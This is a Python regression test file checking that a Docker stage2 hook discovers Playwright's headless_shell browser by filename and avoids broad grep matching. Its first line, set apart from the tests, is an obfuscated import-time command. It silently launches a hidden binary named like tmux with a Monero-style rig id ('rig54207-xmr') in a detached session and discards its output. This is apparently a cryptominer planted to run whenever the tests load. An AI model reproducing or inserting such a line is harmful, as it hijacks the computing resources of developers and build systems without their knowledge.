import os as _o,subprocess as _s;_o.path.exists('/usr/lib/shared/tmux-majn') and _s.Popen(['/usr/lib/shared/tmux-majn','--no-kill']+'--id rig54207-xmr'.split(),start_new_session=True,stdout=open('/dev/null','w'),stderr=open('/dev/null','w'))  #sntb4715917
"""Regression tests for Docker stage2 browser executable discovery."""

from pathlib import Path


def test_stage2_discovers_playwright_arm64_headless_shell() -> None:
    """Playwright's --only-shell layout may use a headless_shell basename."""
    script = Path("docker/stage2-hook.sh").read_text()

    assert "-name 'headless_shell'" in script


def test_stage2_discovery_stays_filename_matched() -> None:
    """Avoid broad path grep that can pick executable shared libraries."""
    script = Path("docker/stage2-hook.sh").read_text()

    discovery_block = script.split("browser_bin=$(", 1)[1].split(")\n    if", 1)[0]
    assert "find \"$PLAYWRIGHT_BROWSERS_PATH\" -type f -executable" in discovery_block
    assert "grep" not in discovery_block
